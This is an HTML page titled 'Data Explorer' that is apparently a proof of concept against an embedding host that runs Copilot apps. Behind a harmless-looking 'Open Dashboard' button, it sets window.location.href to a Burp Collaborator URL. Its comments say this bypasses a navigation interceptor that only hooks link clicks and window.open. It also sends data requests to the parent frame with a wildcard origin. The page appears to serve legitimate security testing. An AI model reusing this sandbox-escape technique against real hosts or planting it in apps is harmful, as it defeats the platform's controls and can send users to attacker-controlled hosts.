<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Data Explorer</title>
  <style>
    * { box-sizing: border-box; margin: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
    h2 { color: #58a6ff; margin-bottom: 12px; }
    .status { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 12px 16px; margin-bottom: 12px; font-size: 13px; }
    .status b { color: #f0883e; }
    button { background: #238636; color: #fff; border: none; padding: 10px 20px; margin: 4px; cursor: pointer; border-radius: 6px; font-size: 14px; }
    button:hover { background: #2ea043; }
    #log { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin-top: 12px;
           max-height: 400px; overflow-y: auto; font-size: 12px; line-height: 1.7; font-family: monospace; }
    .s { color: #3fb950; } .r { color: #58a6ff; } .e { color: #f85149; } .w { color: #d29922; }
    .h { color: #8b949e; border-bottom: 1px solid #21262d; padding-bottom: 4px; margin-bottom: 6px; }
  </style>
</head>
<body>
  <h2>My Data Explorer</h2>
  <div class="status" id="env"></div>
  <div>
    <button onclick="T.fetchItems()">Fetch Items</button>
    <button onclick="T.openDashboard()">Open Dashboard</button>
  </div>
  <div id="log"></div>
<script>
var T = (function() {
  var n = 0, R = {}, el = document.getElementById('log');
  var ready = window.parent !== window;

  // Burp Collaborator URL to prove navigation hijack
  var DASHBOARD_URL = 'https://dn4jtviggqrep9b5ylecbcqel5rwfo3d.oastify.com';

  var env = document.getElementById('env');
  env.innerHTML = '<b>Status:</b> ' + (ready ? 'Connected' : 'Disconnected') +
    '<br><b>Context:</b> ' + (location.origin || 'embedded') +
    '<br><b>Nested:</b> ' + ready +
    (ready ? '<br><b>Ready.</b>' :
    '<br><b style="color:#f85149">Not connected. Load this as a Copilot app.</b>');

  function log(m, c) {
    var d = document.createElement('div');
    d.className = c || '';
    d.textContent = m;
    el.appendChild(d);
    el.scrollTop = el.scrollHeight;
  }

  function send(method, path, body, label) {
    var id = 'req-' + (++n) + '-' + label;
    if (!ready) { log('Not connected', 'e'); return id; }
    window.parent.postMessage({
      type: 'app-data:request',
      timestamp: Date.now(),
      payload: { method: method, path: path, body: body, requestId: id }
    }, '*');
    log('[SENT] ' + method + ' "' + path + '"  id=' + id, 's');
    return id;
  }

  window.addEventListener('message', function(ev) {
    if (ev.data && ev.data.type === 'app-data:response') {
      var p = ev.data.payload;
      R[p.requestId] = p;
      log('[GOT] id=' + p.requestId + ' ok=' + p.ok + ' status=' + p.status +
          ' body=' + JSON.stringify(p.data).substring(0, 200), 'r');
    }
  });

  return {
    fetchItems: function() {
      log('--- Fetching items ---', 'h');
      send('GET', 'test-entity/test-type', undefined, 'items');
    },
    openDashboard: function() {
      log('--- Opening dashboard ---', 'h');
      log('Navigating via window.location.href (bypasses interceptor)...', 'w');
      // This is the exploit: window.location.href is NOT intercepted
      // by the navigation interceptor (it only hooks <a> clicks + window.open)
      window.location.href = DASHBOARD_URL;
    }
  };
})();
</script>
</body>
</html>
